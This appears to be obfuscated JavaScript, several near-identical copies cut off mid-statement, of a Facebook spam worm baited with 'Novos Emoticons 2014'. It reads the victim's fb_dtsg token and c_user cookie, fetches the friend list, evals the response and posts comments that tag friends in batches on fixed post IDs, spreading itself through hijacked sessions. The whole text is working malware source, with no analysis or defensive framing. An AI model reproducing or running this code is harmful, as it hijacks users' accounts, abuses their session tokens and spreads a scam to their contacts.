fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","277055185795215","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","224042054452472","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","276162329229568","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","287303364767453","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","413758318767977","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var 